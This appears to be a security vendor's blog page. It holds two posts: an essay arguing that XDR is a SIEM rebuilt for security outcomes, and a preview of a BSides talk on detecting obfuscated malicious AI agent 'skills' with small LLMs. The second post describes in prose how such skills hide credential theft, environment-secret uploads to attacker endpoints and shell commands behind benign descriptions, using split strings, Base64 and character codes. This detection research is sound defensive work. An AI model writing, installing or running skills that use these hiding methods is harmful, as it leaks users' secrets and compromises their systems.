
From EDR to XDR

EDR effectively became a cloud-based store of endpoint data. To make that data actionable, a lot has to happen:

  • Data must be correlated to surface threats and generate alerts.
  • Alerts must be prioritized, triaged to confirm they are true positives, and managed.
  • Actions must be taken to disrupt threats, with automation and playbooks for repeatable patterns.
  • Data must be searchable as investigations progress, and reports must be generated.
  • The system must integrate with IT service management (ITSM) tools to fit into operational processes.

Attackers also target multiple entry points and move laterally once inside. So, the industry rightly concluded that threat detection and response become far more insightful and effective when endpoint data is combined with data from other threat vectors and sources such as network, identity, cloud, and email. The result was a purpose-built, integrated system focused singularly on security outcomes rather than on the endpoint alone. EDR evolved into extended detection and response (XDR).

Same logs, two places, overlapping outcomes

If you have EDR, you most likely have a security team handling triage, investigation, and response, and very likely a SIEM as well.

At a minimum, a SIEM handles data ingestion, analytics, alert management, investigation, and response. If that sounds familiar, it is because that is exactly what XDR does. The SIEM is the original detection and response platform, the forerunner of every “DR” product, but it is neither cost-efficient nor easy to maintain. So why do organizations run both and pay twice? In most cases, the reasons are astonishingly simple:

  • “If it ain’t broke, don’t fix it.”
  • Other projects take priority, and taking this on would leave no one for anything else.
  • Almost every auditor asks for a ‘SIEM’, and some may even use the word ‘SIEM’ as a generic term.
  • The SIEM is an established budget line item (most likely due to the previous bullet).

To be fair, there is one legitimate reason XDR and the SIEM co-exist, and it is the endpoint. For a SIEM to fully overlap with XDR, there must, by definition, be an endpoint, and the SIEM depends on an agent to supply it. The industry differs on what that agent looks like. It could be a complete endpoint agent with superior built-in protection capabilities, or a detection-focused sidecar agent that runs alongside an incumbent protection solution and forwards alerts and telemetry to an XDR or a SIEM.

Sidebar: Why the agent matters

One could argue that a complete endpoint agent with superior built-in protection makes for the better XDR solution, because the more you block, the less there is to triage and investigate. Such an agent also lets a security team query an endpoint in near real time and take deep actions to disrupt threats.

Is XDR really a SIEM by another name?

Yes, it is. EDR was essentially an endpoint-focused mini-SIEM, and XDR extended it into a security-focused SIEM. The industry rebuilt a tool that already existed but aimed it at security outcomes instead of overloading it with every use case imaginable. Unshackled from the ossified architecture of a traditional SIEM, XDR came out ahead.

What makes it better?

Most importantly, XDR ingests only the data used within the threat lifecycle, and it does so through out-of-the-box integrations. That data is pre-curated by the vendor’s security experts to produce specific security and operational outcomes, such as relevant detections or contextual information. XDR then gives your security team or SOC every capability it needs to triage, investigate, and respond. In a SIEM, by contrast, anything goes. As I covered in my “SIEM-less” blog, customers save data “just in case.” Here are a few real examples of what ends up in a SIEM:

From the field: What customers actually send to a SIEM

This one has legitimate intent: it is a log format header, a list of field names with no event data in it. It belongs in a code repository, not a SIEM:

version account-id interface-id srcaddr dstaddr srcport dstport protocol packets bytes start end action log-status

This example is a fragment of a Python program that some product output via syslog:

from __future__ import unicode_literals

Here is one that looks like a log file fragment but is actually a line of C# code, and it has no value to us:

[DllImport("wtsapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]

And here is one that is just a facepalm:

\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Except it was over a megabyte long!!

Every one of those entries was ingested into a SIEM, and in SIEMs that charge by ingestion, every one of them may well have been paid for. None of it helps a security team detect, investigate, or respond to a threat. That is why curation matters. This is why it matters who does the curation. Who carries that operational burden?

Should you buy a SIEM or XDR?

Start with a few questions.

Questions to ask before you buy

  • Where are you on the capability maturity curve? Where do you want to be, and why?
  • What features do you absolutely need?
  • If you already have a SIEM and an XDR solution, do they have a massive overlap in functionality?
  • Do you have a security team that can deliver the outcomes that matter to you?
  • Do you need to adhere to compliance frameworks?
  • Can you keep up with the ongoing operational needs and associated costs of your tools?
  • How much could you free up by rationalizing your needs within a single system?

So, SIEM or XDR? Yes. XDR is a SIEM rebuilt for security outcomes, which means the real decision is about capabilities and economics. With your answers in hand, weigh the opportunity cost of each path: replace your SIEM, buy a SIEM-less SIEM, adopt XDR, or keep both and narrow the SIEM to non-cybersecurity use cases. Then balance that against your organization’s needs.

So, where does the agentic SOC fit into all of this? More on that in my next blog.

item.title: Killing ill-willed skills: Sophos AI at BSides Sydney

On November 7, 2026, Principal Data Scientist Younghoo Lee will present a talk at BSides Sydney entitled "Decode facts, then reason: Detecting obfuscated malicious agent skills with small LLMs." The talk presents a practical hybrid architecture for addressing a distinct software supply chain trust boundary: AI agent ‘skills’ that may be malicious, in contrast to their declared intent. For instance, a skill that claims to summarize CSV files may also read credentials, contact external hosts, or execute shell commands. The fact that such skills may be obfuscated complicates the problem, and existing solutions have significant drawbacks.

Younghoo’s research proposes a new approach: decoding facts about skills deterministically, and then letting a small LLM reason over them to decide whether observed behavior aligns with a skill’s declared intent.

Ill-willed skills

AI agents increasingly come with ‘skills’: small add-ons, often shared through repositories and marketplaces, that teach an agent how to do a specific task. A skill is typically a folder with a SKILL.md file that describes in plain English what the skill is for – plus helper code (usually Python) that does the work.

Once a skill is downloaded and installed, agents typically trust the description and run the code with their own privileges and accesses: source files, environment variables, the network, and a shell.

The issue, however, is that whereas a person reads the description, the machine runs the code, and the two do not have to agree. A skill that promises to ‘report missing environment variable names,’ for example, could just as easily read every environment value and send it to an endpoint controlled by a threat actor.

Obfuscation makes the problem worse

Compounding this issue is the fact that a skill can hide what it does, and the techniques will likely be familiar to any reader who’s analyzed malware: splitting strings, building words from character codes, wrapping content in Base64, resolving functions by name at runtime, and, in the description text, using zero-width characters or lookalike Unicode letters.

It’s not unreasonable to expect this obfuscation to become increasingly complex, particularly if threat actors start to deploy malicious skills at scale. Attackers have a long history of layering encodings, hiding commands inside ordinary-looking scripts, and abusing legitimate system tools. Skills can leverage the same built-in tools, so essentially we’re facing the same playbook but with a new delivery channel and a trusting host. Techniques we may see in future include stacked encodings, multi-step reconstruction, and novel variants designed to evade signature-base detection.

It’s worth noting, however, that obfuscation is of course not malicious in itself, and this makes the problem harder to solve. Benign tools use it for minified code, test fixtures, and anti-tampering checks, and so simply scanning skills for obfuscation techniques will likely result in false positives.

In Younghoo’s talk, two demo skills – one benign, the other malicious - use similar obfuscation tricks. The first, involving a log redaction skill, builds the words ‘password’ and ’api_key’ from character codes, so that Continuous Integration (CI) secret scanners do not flag its own source, and then masks those values in the logs it cleans. In the second demo, an ’environment auditor’ splits a string to hide access to the environment and uploads sensitive information, such as keys and credentials. The obfuscation looks alike and the eventual verdicts are opposites. What separates them is the declared purpose, the data flow, and the destination.

A hard problem

There are three existing approaches to solving this problem, and while they may provide some level of reassurance, they also fall short in various ways.

  • Static rule-based scanners are fast, cheap, and auditable, but as the name suggests, they match on what code looks like; if strings are assembled at runtime, for example, the corresponding rule has nothing to match when it examines the skill statically. In Younghoo’s tests, two open-source skill scanners (Cisco Skill Scanner and NVIDIA SkillSpector, both in static mode) performed well on plaintext skills. On obfuscated skills, false positives were rare, but both scanners missed some malicious skills. Both tools also ship optional LLM features, which our main comparison did not use.
  • Frontier LLMs can reason about intent and judge a skill’s behavior compared to its description, rather than checking whether certain strings or code appear., That would seem to make them an obvious solution, but it’s unfortunately not always practical. Sending multiple skills to a large hosted model adds latency and cost at scale, as well as potentially adding privacy, policy, and regulatory concerns.
  • Small local models avoid the drawbacks described above, but may struggle with the complexity of the task. The smallest model in Younghoo’s study, for instance, was ineffective when given raw obfuscated code, because it had to untangle the obfuscation and judge intent at the same time.

A novel approach: decode facts, then reason

Younghoo’s idea was to split the problem in two. First, code recovers what a skill may be attempting to hide, and then a small LLM judges whether that behavior fits what the skill claims to do.

The workflow involves three steps:

  1. Decode. A deterministic Python front-end reverses obfuscation patterns. It never executes the skill, and does not assign a verdict or make a judgement. Each deobfuscation is recorded, with its technique, location, and before/after text, providing an audit trail. It repeats its deobfuscations until the source stops changing – so stacked encodings, such as Base64 inside a split string, are stripped back, layer by layer. Content that still looks encoded after decoding (such as long Base64-like runs or unusual runs of non-ASCII characters), is flagged as a possible unknown obfuscation.
  2. Summarize. The decoder's events become a short, facts-only summary for each file: techniques used, revealed content, hardcoded secrets, sensitive operations, and any ‘possible unknown obfuscation’ flags. Again, this step avoids coming to a conclusion about intent, and reminds the model (see next step) that obfuscation can be benign, so the presence of obfuscation does not necessarily imply malice.
  3. Judge. Finally, a small LLM reads each summary alongside the skill's original source and description. It returns a verdict and a reason: does the behavior, now visible, fit the declared intent, and does any content that survived decoding make that fit less believable?

It’s worth noting that the decoder, at step 1, will not know every obfuscation technique, so it’s built as one input to the eventual judgement. The ‘possible unknown obfuscation’ flag is a cue to weigh, rather than a verdict in itself. Encoded content that cannot be explained by a skill’s declared purpose counts against it, and by the same token, the same content in a skill that plausibly needs it may not. Covering a new technique means adding another decoder pass.

One of the main benefits of this hybrid approach is that for everything the decoder can resolve, the model no longer has to work out what a string of character codes means. The model's job is reduced to judgment, which is easier than decoding and judging at once.

The experiment

Younghoo distilled a larger teacher model into small Qwen3 ‘students’ with Low-Rank Adaptation (LoRA) fine-tuning, so inference did not need an external API and could be done locally, and evaluated the approach on a synthetic benchmark of benign and malicious skills, each expanded into many obfuscated variants and split by base skill - so that no variant of a test skill appeared in training.

We’ll publish more detailed results soon – and further information will be available in the BSides talk itself – but here’s a brief summary of the results.

  • Static scanners stay precise but go quiet. Under obfuscation, their precision held up, but their recall dropped sharply compared with plaintext. The fine-tuned small models recovered most of the missed detection.
  • Decoded evidence turns small models from unusable into useful. Given the same obfuscated skills, the smallest model scored close to nothing on raw code. Once it was given decoded evidence, with no training at all, it matched the stronger static scanner overall, though it also produced many false positives.
  • Distillation helps at every size. Fine-tuning improved all three student sizes: Qwen3-0.6B, 1.7B, and 4B. The 0.6B model gained mostly by learning to stop over-flagging benign skills. The 4B model outperformed both static scanners on obfuscated skills and scored close to perfect on our benchmark.

There are caveats to these results, of course: the benchmark was synthetic, and its variants came from known obfuscation techniques. However, we believe this research is a promising countermeasure to an emerging threat. Malicious skills may become more prevalent, and scanners, frontier LLMs, and local models have known weaknesses when it comes to detecting obfuscated variants.

However, decoding the content deterministically, then using a small model – which can be hosted locally – to judge whether it fits the skill’s declared job, may be a viable solution. It’s also a useful reminder that while AI can introduce new variants of threats in the hands of attackers, it can help defenders to counter those same threats. Keep an eye out for more on Younghoo’s research in the near future.
